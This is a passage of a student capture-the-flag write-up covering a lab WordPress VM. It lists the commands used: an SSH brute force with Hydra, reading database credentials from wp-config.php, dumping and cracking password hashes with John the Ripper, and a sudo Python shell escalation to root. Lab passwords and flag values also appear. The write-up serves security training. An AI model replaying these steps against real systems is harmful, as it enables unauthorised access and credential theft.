    - Targeting User Michael
      - Executed Hydra Brute Force Attack
        - The following command was performed:

        - Password: Michael
        - ![alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/hydrabruteforcemichael.png)
    - Capturing Flag 1: After SSH Brute Force Attack as Michael I traversed through directories and files.
      - Found Flag1 in  var/www/html folder at root in service.html in a HTML comment below the footer.
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
    - **Exploit Used**
      - Same exploit covered in flag1 to gain access
      - Commands:
        - ssh michael@192.168.1.110
        - pw: michael
        - cd ../
        - cd /var/www
        - find / i-name flag*
        - cat flag2.txt

  - `flag3` : afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - Previous exploit covered in flag1 and flag2
      - Captured flag3 Accessing MySQL database
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database
        - the wp-config.php displayed DB_Password in plaintext
        - ![alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/47ad8ccdf0e2d7a701b29fd857043666040aed6d/Images/Offense%20Images/wp-configphp.png)
        - flag3 was found in wp_posts table in the wordpress database.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - show databases;
          - use wordpress;
          - show tables;
          - select * from wp_posts;
   - ![alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8a9ac76506c514988a6b20a129696a48ae0fc69e/Images/Offense%20Images/mysqlconnect.png)

  - `flag4` : 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Use of weak password salted hashes and Python root escalation privileges
      - Captured flag4 by retrieving user credentials from database, executed john the ripper to crack password hash and use Python Escalation Privileges to gain root access
        - Previously gained access to the database credentials as Michael from the sp-config.phpfile, cracking password hashes gathered from MySQL was the next step.
        - These user credentials are stored in the wp_users table of the wordpress database.
        - The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
        - Commands:
          - Connected to mysql: -u root -p R@v3nSecurity
          - SELECT ID, user_login, user_pass FROM wp_users;
        - ![alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/8325e679b7615499ce833972057be8bd7ba43068/Images/Offense%20Images/stevenhashedsql.png)
        - When I exported the hashes, I saved them individually as stevenhash.txt and michaelhash.txt and ran them against John the Ripper to crack the hashes.
          - Command:
            - john stevenhash.txt
            - john michaelhash.txt; the execution of performing the john the ripper kept on going; but we already had the password from the previous activity.
            - [alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/33c3d21df349df89410d1cbbdf73db2f9914a7a7/Images/Offense%20Images/jtrstevenhash.png)
          - Once Steven???s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
          - Command:
            - ssh steven@192.168.1.110
            - pw:pink84
            - sudo -l
            - sudo python -c ???import pty;pty.spawn(???/bin/bash???)???
            - cd /root
            - ls
            - cat flag4.txt
      - ![alt text](https://github.com/Juan-byte-megabyte/Rice-CyberSecurity-FinalProject/blob/33c3d21df349df89410d1cbbdf73db2f9914a7a7/Images/Offense%20Images/ravensteven.png)
